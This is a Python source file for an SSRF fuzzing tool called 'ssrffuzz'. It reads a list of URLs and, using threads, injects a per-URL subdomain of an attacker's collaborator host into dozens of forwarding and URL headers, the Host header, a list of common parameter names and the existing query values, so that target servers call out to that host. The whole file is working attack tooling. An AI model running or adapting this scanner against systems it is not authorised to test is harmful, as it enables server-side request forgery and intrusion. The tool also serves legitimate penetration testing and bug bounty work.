from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import requests
from urllib.parse import  urlparse, parse_qs,urlencode
import  urllib
import hashlib
import threading
import optparse


def req(URL,colab,cookies,hash,queue):
    host = hash + "." + colab
    url = "https://" + host

    host_header = {
                   'Proxy-Host': host,
                   'Real-Ip': host,
                   'Referer': host,
                   'X-Forwarded-By': host,
                   'X-Forwarded-For': host,
                   'X-Forwarded-For-Original': host,
                   'X-Forwarded': host,
                   'X-Forwarded-Host': host,
                   'X-Forwarded-Server': host,
                   'X-Forwarder-For': host,
                   'X-Forward-For': host,
                   'X-Host': host,
                   'X-Http-Host-Override': host,
                   'X-Original-Remote-Addr': host,
                   'X-Real-Ip': host,
                   'X-Remote-Addr': host
                   }

    url_header = {'Base-Url': url,
                  'Http-Url': url,
                  'Proxy-Url': url,
                  'Redirect': url,
                  'Referrer': url,
                  'Request-Uri': url,
                  'Uri': url,
                  'Url': url,
                  'X-Http-Destinationurl': url,
                  'X-Original-Url': url,
                  'X-Proxy-Url': url,
                  'X-Rewrite-Url': url,
                  }

    requests.get(URL,headers=host_header,cookies=cookies)
    requests.get(URL,headers=url_header,cookies=cookies)

    requests.get(URL, headers={'Host': host}, cookies=cookies)

    parameter_all_in_one(URL,url,cookies=cookies)
    replace_param(URL,url,cookies)
    queue.put(URL)


def parameter_one_by_one(URL,colab,cookies):
    parameters = ["access", "admin", "dbg", "debug", "edit", "grant", "test", "alter", "clone", "create", "delete",
                  "disable", "enable", "exec", "execute", "load", "make", "modify", "rename", "reset", "shell",
                  "toggle", "adm", "root", "cfg", "dest", "redirect", "uri", "path", "continue", "url", "window",
                  "next", "data", "reference", "site", "html", "val", "validate", "domain", "callback", "return",
                  "page", "feed", "host", "port", "to", "out", "view", "dir", "show", "navigation", "open "]

    for param in parameters:
        url="{}?{}={}".format(URL.split('?')[0],param,colab)
        requests.get(url,cookies=cookies)

def replace_param(URL,colab,cookies):
    parse = urlparse(URL)
    for i in parse_qs(parse.query):
        query = parse_qs(parse.query)
        query[i] = [colab]
        for i in query:
            query[i] = query[i][0]
        q = urlencode(query, doseq=True)
        a = "{}://{}?{}".format(parse[0], parse[1], q)
        requests.get(a,cookies=cookies)

def parameter_all_in_one(URL,COLAB,cookies):
    parameters = {"access": COLAB , "admin": COLAB , "dbg": COLAB , "debug": COLAB , "edit": COLAB , "grant": COLAB , "test": COLAB , "alter": COLAB , "clone": COLAB , "create": COLAB , "delete": COLAB ,
                  "disable": COLAB , "enable": COLAB , "exec": COLAB , "execute": COLAB , "load": COLAB , "make": COLAB , "modify": COLAB , "rename": COLAB , "reset": COLAB , "shell": COLAB ,
                  "toggle": COLAB , "adm": COLAB , "root": COLAB , "cfg": COLAB , "dest": COLAB , "redirect": COLAB , "uri": COLAB , "path": COLAB , "continue": COLAB , "url": COLAB , "window": COLAB ,
                  "next": COLAB , "data": COLAB , "reference": COLAB , "site": COLAB , "html": COLAB , "val": COLAB , "validate": COLAB , "domain": COLAB , "callback": COLAB , "return": COLAB ,
                  "page": COLAB , "feed": COLAB , "host": COLAB , "port": COLAB , "to": COLAB , "out": COLAB , "view": COLAB , "dir": COLAB , "show": COLAB , "navigation": COLAB , "open": COLAB}

    param =urllib.parse.urlencode(parameters, doseq=True)
    URL = "{}?{}".format(URL.split('?')[0],param)
    requests.get(URL,cookies=cookies)



def done(queue,stop_event):
    RED = '\033[31m'
    GREEN = '\033[32m'
    RESET = '\033[0m'
    while not stop_event.is_set():
        url= queue.get()
        print("[ {}done{} ] {}".format(GREEN,RESET,url))



def pool(filename,threads,colab,cookies):
    print("urls_path=\033[33m{}\033[0m    colab=\033[33m{}\033[0m          threads=\033[33m{}\033[0m  cookies={} ".format(filename,threads,colab,cookies))
    queue= Queue()
    stop_event =threading.Event()
    t=threading.Thread(target=done,args=(queue,stop_event),daemon=True)
    t.start()
    Lines = open(filename, 'r').readlines()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        with open("hash.txt", 'w') as out:
            for i in Lines:
                 url= i.replace("\n", "")
                 hash = hashlib.sha224(url.encode('UTF-8')).hexdigest()
                 executor.submit(req,url,colab,cookies,hash,queue)
                 out.write(hash +"     "+ url + '\n')
    stop_event.set()




def logo():
    print("""  \033[34m    
                           __  __  byMedbsq              
             ___ ___ _ __ / _|/ _|_   _ ________
            / __/ __| '__| |_| |_| | | |_  /_  /
            \__ \__ \ |  |  _|  _| |_| |/ / / / 
            |___/___/_|  |_| |_|  \__,_/___/___|
             https://github.com/medbsq/ssrf.git
    
    
     \033[0m
        """)



def Main():
    parser = optparse.OptionParser(" help: \n" +\
                                   "\tssrf_header -f <url_fielname> -c  <colaborato> -t <threads_number> \n")
    parser.add_option("-f",dest="filename",type="string",help="spicify file of urls")
    parser.add_option("-t",dest="threads",type="int",help="spicify nybmer of threads")
    parser.add_option("-c",dest="colab",type="string",help="spicify collaborator")

    (options ,args) = parser.parse_args()

    threads = 10
    cookies = None
    if (options.filename != None and options.colab != None) :
        colab = options.colab
        if (options.filename != None):
            filename = options.filename
        if (options.threads != None):
            threads = options.threads

    else:
        print(parser.usage)
        exit(1)

    pool(filename,threads,colab,cookies)



if __name__ == '__main__':
    logo()
    Main()

